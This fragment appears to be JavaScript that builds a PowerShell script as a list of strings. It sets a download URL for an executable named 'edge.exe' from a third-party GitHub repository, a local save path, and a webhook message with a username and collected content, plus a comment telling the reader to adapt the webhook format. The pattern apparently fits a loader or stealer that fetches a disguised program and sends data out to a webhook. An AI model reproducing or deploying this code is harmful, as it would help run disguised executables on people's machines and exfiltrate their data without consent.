...
let script = [
    ...
    "$exeUrl = 'https://github.com/luciferseamus/Browser_exe/raw/main/edge/edge.exe';",
    "$exePath = '.\\edge.exe';",
    ...
    "$webhookContent = @{'username' = 'H1g0rlu';'content' = $content;};" + //Adjust this to match your webhook format.
